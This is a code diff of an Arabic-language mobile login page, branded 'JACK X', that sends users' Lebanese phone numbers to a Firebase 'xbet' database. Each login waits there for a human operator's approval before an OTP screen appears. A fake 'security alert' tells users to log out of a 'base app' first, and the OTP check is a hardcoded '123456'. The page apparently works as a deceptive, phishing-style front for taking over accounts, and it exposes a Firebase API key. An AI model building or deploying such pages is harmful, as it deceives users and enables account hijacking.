@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>JACK X | Vapor OS</title>
+<title>JACK X | Admin Approval</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap');
   
@@ -18,29 +18,16 @@
   }
 
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; font-family:'Tajawal', sans-serif; outline:none; }
-  body { 
-    background: var(--bg-gradient); 
-    color: var(--text-main); 
-    height: 100vh; 
-    overflow: hidden; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center;
-  }
+  body { background: var(--bg-gradient); color: var(--text-main); height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
   
   .app-frame { 
-    width: 100%; max-width: 420px; height: 100%; 
-    position: relative; 
-    background: rgba(255,255,255,0.4); 
-    backdrop-filter: blur(40px); 
-    -webkit-backdrop-filter: blur(40px);
-    display: flex; 
-    flex-direction: column; 
-    overflow: hidden; 
+    width: 100%; max-width: 420px; height: 100%; position: relative; 
+    background: rgba(255,255,255,0.4); backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
+    display: flex; flex-direction: column; overflow: hidden; 
   }
   @media(min-width: 450px) { .app-frame { border-radius: 40px; height: 90vh; box-shadow: 0 20px 60px rgba(0,0,0,0.15); border: 1px solid var(--glass-border); } }
 
-  /* Header */
+  /* Header & Typography */
   .header { padding: 50px 24px 20px; text-align: center; flex-shrink: 0; z-index: 10; }
   .logo { font-size: 38px; font-weight: 900; color: var(--primary); letter-spacing: -1.5px; font-style: italic; text-shadow: 0 4px 15px rgba(227,29,74,0.2); }
   .back-btn { position: absolute; top: 45px; left: 24px; cursor: pointer; opacity: 0.5; transition: 0.3s; z-index: 20; }
@@ -54,35 +41,14 @@
 
   /* Inputs Vapor Style */
   .input-wrapper { 
-    width: 100%; 
-    background: var(--glass-bg); 
-    border-radius: var(--radius-xl); 
-    border: 1px solid var(--glass-border); 
-    padding: 6px; 
-    display: flex; 
-    align-items: center; 
-    gap: 12px; 
-    margin-bottom: 24px; 
-    box-shadow: inset 0 2px 8px rgba(0,0,0,0.02), 0 4px 15px rgba(255,255,255,0.5);
-    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+    width: 100%; background: var(--glass-bg); border-radius: var(--radius-xl); border: 1px solid var(--glass-border); 
+    padding: 6px; display: flex; align-items: center; gap: 12px; margin-bottom: 24px; 
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.02), 0 4px 15px rgba(255,255,255,0.5); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
   }
-  .input-wrapper:focus-within { 
-    background: #fff; 
-    border-color: var(--primary); 
-    box-shadow: 0 0 0 4px rgba(227, 29, 74, 0.08), 0 10px 25px rgba(227,29,74,0.1);
-    transform: scale(1.02);
-  }
+  .input-wrapper:focus-within { background: #fff; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(227, 29, 74, 0.08), 0 10px 25px rgba(227,29,74,0.1); transform: scale(1.02); }
   
-  .flag-leb { 
-    width: 32px; height: 22px; 
-    background: linear-gradient(to bottom, #ED1C24 33%, #FFF 33%, #FFF 66%, #ED1C24 66%); 
-    border-radius: 6px; 
-    position: relative; 
-    border: 1px solid rgba(0,0,0,0.05);
-    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-  }
+  .flag-leb { width: 32px; height: 22px; background: linear-gradient(to bottom, #ED1C24 33%, #FFF 33%, #FFF 66%, #ED1C24 66%); border-radius: 6px; position: relative; border: 1px solid rgba(0,0,0,0.05); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
   .flag-leb::after { content:''; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:3px; height:8px; background:#00A651; border-radius:1px; }
-  
   .code-prefix { font-weight: 800; font-size: 16px; direction: ltr; color: var(--text-main); padding-left: 4px; border-left: 1px solid rgba(0,0,0,0.1); }
   input.phone-inp { border: none; flex: 1; font-size: 20px; font-weight: 700; direction: ltr; text-align: right; background: transparent; padding-right: 8px; color: var(--text-main); }
 
@@ -90,74 +56,47 @@
   .terms a { color: var(--primary); text-decoration: none; font-weight: 700; }
 
   /* Buttons */
-  .btn-vapor { 
-    width: 100%; padding: 20px; 
-    background: var(--primary); 
-    color: #fff; border: none; 
-    border-radius: var(--radius-xl); 
-    font-size: 19px; font-weight: 800; 
-    cursor: pointer; margin-top: 24px; 
-    transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); 
-    box-shadow: 0 10px 25px rgba(227, 29, 74, 0.35);
-    position: relative; overflow: hidden;
-  }
+  .btn-vapor { width: 100%; padding: 20px; background: var(--primary); color: #fff; border: none; border-radius: var(--radius-xl); font-size: 19px; font-weight: 800; cursor: pointer; margin-top: 24px; transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); box-shadow: 0 10px 25px rgba(227, 29, 74, 0.35); position: relative; overflow: hidden; }
   .btn-vapor::after { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition:0.5s; }
   .btn-vapor:hover::after { left:100%; }
   .btn-vapor:active { transform: scale(0.96); box-shadow: 0 5px 15px rgba(227, 29, 74, 0.2); }
-  
   .btn-disabled { background: #ffdce6; color: #fff; box-shadow: none; cursor: not-allowed; pointer-events: none; transform: none !important; }
   .btn-disabled::after { display: none; }
 
   /* OTP Screen */
   .otp-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; width: 100%; margin-bottom: 35px; }
-  .otp-cell { 
-    aspect-ratio: 1; 
-    background: var(--glass-bg); 
-    border-radius: 16px; 
-    display: flex; align-items: center; justify-content: center; 
-    font-size: 26px; font-weight: 900; 
-    transition: all 0.3s ease; 
-    border: 1px solid transparent;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.03);
-  }
+  .otp-cell { aspect-ratio: 1; background: var(--glass-bg); border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: 900; transition: all 0.3s ease; border: 1px solid transparent; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
   .otp-cell.active { background: #fff; border-color: var(--primary); color: var(--primary); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(227,29,74,0.15); }
-  
   .otp-footer { width: 100%; display: flex; justify-content: space-between; font-size: 13px; color: var(--text-sub); margin-bottom: 20px; font-weight: 500; }
   .resend-link { color: var(--primary); font-weight: 800; cursor: pointer; opacity: 0.4; pointer-events: none; transition: 0.3s; }
   .resend-link.live { opacity: 1; pointer-events: auto; text-decoration: underline; text-underline-offset: 4px; }
 
-  /* Dialog Vapor */
+  /* Dialog & Loader */
   .dialog-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); z-index: 100; display: none; align-items: center; justify-content: center; padding: 30px; }
-  .dialog-card { 
-    background: rgba(255,255,255,0.9); 
-    width: 100%; max-width: 310px; 
-    border-radius: 32px; 
-    padding: 35px 28px; 
-    text-align: center; 
-    box-shadow: 0 30px 60px rgba(0,0,0,0.15); 
-    border: 1px solid rgba(255,255,255,0.6);
-    animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
-  }
+  .dialog-card { background: rgba(255,255,255,0.9); width: 100%; max-width: 310px; border-radius: 32px; padding: 35px 28px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.6); animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
   @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-  
   .d-icon { font-size: 52px; margin-bottom: 20px; display: block; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1)); }
   .d-title { font-size: 22px; font-weight: 900; margin-bottom: 14px; color: var(--text-main); }
   .d-msg { font-size: 14px; color: var(--text-sub); line-height: 1.7; margin-bottom: 28px; font-weight: 500; }
-  
   .d-btn { width: 100%; padding: 16px; border-radius: 18px; border: none; font-size: 16px; font-weight: 800; cursor: pointer; margin-bottom: 12px; transition: 0.2s; }
   .d-confirm { background: var(--primary); color: #fff; box-shadow: 0 8px 20px rgba(227,29,74,0.3); }
   .d-cancel { background: #f2f2f7; color: var(--text-main); }
 
-  .hidden { display: none !important; }
-  .loader { position: absolute; inset:0; background: rgba(255,255,255,0.8); backdrop-filter:blur(5px); display:none; align-items:center; justify-content:center; z-index:200; border-radius: inherit;}
-  .spinner { width: 40px; height: 40px; border: 4px solid #eee; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
+  .loader-overlay { position: absolute; inset:0; background: rgba(255,255,255,0.85); backdrop-filter:blur(10px); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:200; border-radius: inherit;}
+  .spinner { width: 45px; height: 45px; border: 4px solid #eee; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
   @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-text { font-size: 16px; font-weight: 700; color: var(--text-main); }
+
+  .hidden { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="app-frame">
-  <div class="loader" id="loader"><div class="spinner"></div></div>
+  <div class="loader-overlay" id="loaderOverlay">
+    <div class="spinner"></div>
+    <div class="loader-text" id="loaderText">جاري الاتصال...</div>
+  </div>
   
   <div class="back-btn hidden" id="backBtn" onclick="goBack()">
     <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
@@ -168,14 +107,12 @@
   <!-- Screen 1: Phone -->
   <div id="screen-login" class="content">
     <h1>ابدأ باستخدام التطبيق</h1>
-    <p class="sub">أدخل رقم هاتفك للمحمول، سيتم إرسال رمز تأكيد.</p>
-
+    <p class="sub">أدخل رقم هاتفك للمحمول، سيتم إرسال طلب تفعيل.</p>
     <div class="input-wrapper">
       <input type="tel" id="phoneInput" class="phone-inp" placeholder="xx xxx xxxx" maxlength="10" inputmode="numeric">
       <span class="code-prefix">+961</span>
       <div class="flag-leb"></div>
     </div>
-
     <p class="terms">عند تسجيل الدخول باستخدام رقم هاتفك، فإنك توافق على <a href="#">البنود والشروط</a></p>
     <button class="btn-vapor" id="loginBtn" onclick="handleLogin()">تسجيل الدخول</button>
   </div>
@@ -183,10 +120,9 @@
   <!-- Screen 2: OTP -->
   <div id="screen-otp" class="content hidden">
     <h1>أدخل رمز التفعيل</h1>
-    <p class="sub">أدخل رمز التفعيل الذي تلقينته برسالة نصية.</p>
+    <p class="sub">تمت الموافقة على طلبك. أدخل الرمز المرسل.</p>
     <div class="otp-grid" id="otpGrid"></div>
     <input type="number" id="otpHidden" style="position:absolute;opacity:0;pointer-events:none;" inputmode="numeric" maxlength="6">
-
     <div class="otp-footer">
       <span class="resend-link" id="resendLink">لم تتلقى الرمز؟</span>
       <span id="timerText">أعد إرسال الرمز بعد: <b id="timeCount">00:30</b></span>
@@ -198,20 +134,19 @@
 <!-- Dialog -->
 <div class="dialog-overlay" id="customDialog">
   <div class="dialog-card">
-    <span class="d-icon">⚠️</span>
-    <h3 class="d-title">تنبيه أمني</h3>
-    <p class="d-msg">ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.</p>
-    <button class="d-btn d-confirm" onclick="confirmWarning()">موافق، سأقوم بتسجيل الخروج</button>
-    <button class="d-btn d-cancel" onclick="closeDialog()">إلغاء</button>
+    <span class="d-icon" id="dIcon">⚠️</span>
+    <h3 class="d-title" id="dTitle">تنبيه أمني</h3>
+    <p class="d-msg" id="dMsg">ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.</p>
+    <button class="d-btn d-confirm" id="dConfirmBtn" onclick="confirmWarning()">موافق، سأقوم بتسجيل الخروج</button>
+    <button class="d-btn d-cancel" id="dCancelBtn" onclick="closeDialog()">إلغاء</button>
   </div>
 </div>
 
-<!-- Firebase SDKs (Database Only) -->
+<!-- Firebase SDKs -->
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
 <script>
-  // ✅ إعدادات فايربيس للداتابيس فقط
   const firebaseConfig = {
     apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
     authDomain: "xbet-86a1f.firebaseapp.com",
@@ -231,7 +166,9 @@
   let otpValue = "";
   let timerInterval = null;
   let currentPhone = "";
-  const VALID_OTP = "123456"; // الرمز الصحيح للتجربة
+  let activeRequestId = null;
+  let approvalListener = null;
+  const VALID_OTP = "123456";
 
   // DOM Elements
   const screenLogin = document.getElementById('screen-login');
@@ -244,9 +181,14 @@
   const dialog = document.getElementById('customDialog');
   const resendLink = document.getElementById('resendLink');
   const timeCount = document.getElementById('timeCount');
-  const loader = document.getElementById('loader');
+  const loaderOverlay = document.getElementById('loaderOverlay');
+  const loaderText = document.getElementById('loaderText');
+  const dIcon = document.getElementById('dIcon');
+  const dTitle = document.getElementById('dTitle');
+  const dMsg = document.getElementById('dMsg');
+  const dConfirmBtn = document.getElementById('dConfirmBtn');
+  const dCancelBtn = document.getElementById('dCancelBtn');
 
-  // Init OTP Boxes
   function initOtp() {
     otpGrid.innerHTML = '';
     for(let i=0; i<6; i++) {
@@ -258,7 +200,6 @@
   }
   initOtp();
 
-  // Navigation
   function switchScreen(to) {
     if(to === 'otp') {
       screenLogin.classList.add('hidden');
@@ -275,63 +216,119 @@
     }
   }
 
-  function goBack() { switchScreen('login'); }
+  function goBack() { 
+    if(approvalListener) approvalListener.off();
+    switchScreen('login'); 
+  }
 
-  // Logic: Check DB then Proceed
+  // --- Core Logic: Send Request & Wait for Admin ---
   function handleLogin() {
     const phone = phoneInput.value.replace(/\s/g, '');
     if(phone.length < 7) { alert("الرجاء إدخال رقم صحيح"); return; }
     
     currentPhone = "+961" + phone;
-    loader.style.display = 'flex';
-
-    // ✅ قراءة فعلية من الداتابيس للتحقق من القفل
+    
+    // 1. Check App Lock Condition First
     db.ref('app_lock').once('value').then(snapshot => {
-      loader.style.display = 'none';
       const data = snapshot.val();
-      
-      // إذا كانت القيمة locked = true أو لم تكن موجودة (افتراضياً مقفل)
       if(!data || data.locked === true) {
         if(!isBaseAppLoggedOut) {
-          dialog.style.display = 'flex';
+          showWarningDialog();
           return;
         }
       }
-      
-      // ✅ كتابة فعلية في الداتابيس (عملية الإرسال)
-      proceedToOtp();
-      
+      // 2. If passed condition, send request to DB
+      submitRequestToAdmin();
     }).catch(err => {
-      loader.style.display = 'none';
       console.error("DB Error:", err);
-      alert("خطأ في الاتصال بالخادم، تأكد من الإنترنت");
+      alert("خطأ في الاتصال بالخادم");
     });
   }
 
   function confirmWarning() {
     isBaseAppLoggedOut = true;
     closeDialog();
-    handleLogin(); // إعادة التحقق بعد الموافقة
+    handleLogin();
   }
 
   function closeDialog() { dialog.style.display = 'none'; }
 
-  function proceedToOtp() {
-    // ✅ حفظ الطلب فعلياً في الداتابيس
-    const requestId = Date.now();
+  function submitRequestToAdmin() {
+    loaderText.textContent = "جاري إرسال الطلب...";
+    loaderOverlay.style.display = 'flex';
+
+    const requestId = Date.now().toString();
+    activeRequestId = requestId;
+
+    // Save request with pending status
     db.ref(`login_requests/${requestId}`).set({
       phone: currentPhone,
       timestamp: Date.now(),
       status: 'pending'
     }).then(() => {
-      console.log("✅ تم إرسال الطلب للداتابيس بنجاح:", requestId);
-      switchScreen('otp');
+      // Start listening for admin approval/rejection
+      listenForApproval(requestId);
     }).catch(err => {
-      alert("فشل في حفظ البيانات: " + err.message);
+      loaderOverlay.style.display = 'none';
+      alert("فشل في إرسال الطلب: " + err.message);
     });
   }
 
-  // OTP Handling
+  function listenForApproval(requestId) {
+    loaderText.textContent = "انتظار موافقة المشرف...";
+    
+    approvalListener = db.ref(`login_requests/${requestId}/status`);
+    approvalListener.on('value', snapshot => {
+      const status = snapshot.val();
+      
+      if(status === 'approved') {
+        approvalListener.off();
+        loaderOverlay.style.display = 'none';
+        switchScreen('otp');
+      } 
+      else if(status === 'rejected') {
+        approvalListener.off();
+        loaderOverlay.style.display = 'none';
+        showRejectionDialog();
+      }
+    });
+  }
+
+  function showRejectionDialog() {
+    dIcon.textContent = "❌";
+    dTitle.textContent = "تم رفض الطلب";
+    dMsg.textContent = "عذراً، قام المشرف برفض طلب تسجيل الدخول الخاص بك. يرجى التأكد من البيانات والمحاولة مرة أخرى.";
+    dConfirmBtn.textContent = "حسناً، فهمت";
+    dConfirmBtn.style.background = "#F44336";
+    dCancelBtn.classList.add('hidden');
+    
+    dConfirmBtn.onclick = () => {
+      closeDialog();
+      // Reset form and go back to login
+      phoneInput.value = "";
+      resetDialogToDefault();
+    };
+    
+    dialog.style.display = 'flex';
+  }
+
+  function showWarningDialog() {
+    resetDialogToDefault();
+    dialog.style.display = 'flex';
+  }
+
+  function resetDialogToDefault() {
+    dIcon.textContent = "⚠️";
+    dTitle.textContent = "تنبيه أمني";
+    dMsg.textContent = "ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.";
+    dConfirmBtn.textContent = "موافق، سأقوم بتسجيل الخروج";
+    dConfirmBtn.style.background = "var(--primary)";
+    dConfirmBtn.onclick = confirmWarning;
+    dCancelBtn.classList.remove('hidden');
+    dCancelBtn.onclick = closeDialog;
+  }
+
+  // --- OTP Handling ---
   otpHidden.addEventListener('input', e => {
     otpValue = e.target.value.replace(/\D/g, '').slice(0, 6);
     updateOtpUI();
@@ -353,17 +350,14 @@
   }
 
   function verifyCode() {
-    loader.style.display = 'flex';
+    loaderText.textContent = "جاري التحقق...";
+    loaderOverlay.style.display = 'flex';
     
-    // ✅ التحقق الفعلي من الرمز (يمكنك ربطه بالداتابيس لاحقاً)
     setTimeout(() => {
-      loader.style.display = 'none';
+      loaderOverlay.style.display = 'none';
       if(otpValue === VALID_OTP) {
         showDialog("success", "تم بنجاح ✅", "تم تسجيل طلبك بنجاح وتم تفعيل الحساب.");
-        // تحديث الحالة في الداتابيس
-        db.ref(`login_requests`).orderByChild('phone').equalTo(currentPhone).once('value', snap => {
-          snap.forEach(child => child.ref.update({ status: 'verified' }));
-        });
+        db.ref(`login_requests/${activeRequestId}`).update({ status: 'verified' });
       } else {
         showDialog("error", "رمز خاطئ ❌", "عفواً، يرجى إدخال رمز الـ OTP الجديد بشكل صحيح.");
         otpValue = ""; otpHidden.value = "";
@@ -384,35 +378,24 @@
         resendLink.classList.add('live');
         resendLink.onclick = () => {
           startTimer();
-          proceedToOtp(); // إعادة الإرسال فعلياً
+          submitRequestToAdmin(); // Re-submit request on resend
         };
       }
     }, 1000);
   }
 
-  // Generic Dialog Helper
   function showDialog(type, title, msg) {
-    const icon = type === 'success' ? '✅' : '❌';
-    const color = type === 'success' ? '#4CAF50' : '#F44336';
-    dialog.querySelector('.d-icon').textContent = icon;
-    dialog.querySelector('.d-title').textContent = title;
-    dialog.querySelector('.d-msg').textContent = msg;
-    dialog.querySelector('.d-confirm').style.background = color;
-    dialog.querySelector('.d-confirm').textContent = "حسناً";
-    dialog.querySelector('.d-cancel').classList.add('hidden');
+    dIcon.textContent = type === 'success' ? '✅' : '❌';
+    dTitle.textContent = title;
+    dMsg.textContent = msg;
+    dConfirmBtn.style.background = type === 'success' ? '#4CAF50' : '#F44336';
+    dConfirmBtn.textContent = "حسناً";
+    dCancelBtn.classList.add('hidden');
     dialog.style.display = 'flex';
     
-    dialog.querySelector('.d-confirm').onclick = () => {
+    dConfirmBtn.onclick = () => {
       closeDialog();
-      setTimeout(() => {
-        dialog.querySelector('.d-icon').textContent = '⚠️';
-        dialog.querySelector('.d-title').textContent = 'تنبيه أمني';
-        dialog.querySelector('.d-msg').textContent = 'ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.';
-        dialog.querySelector('.d-confirm').style.background = 'var(--primary)';
-        dialog.querySelector('.d-confirm').textContent = 'موافق، سأقوم بتسجيل الخروج';
-        dialog.querySelector('.d-confirm').onclick = confirmWarning;
-        dialog.querySelector('.d-cancel').classList.remove('hidden');
-      }, 300);
+      setTimeout(resetDialogToDefault, 300);
     };
   }
 </script>
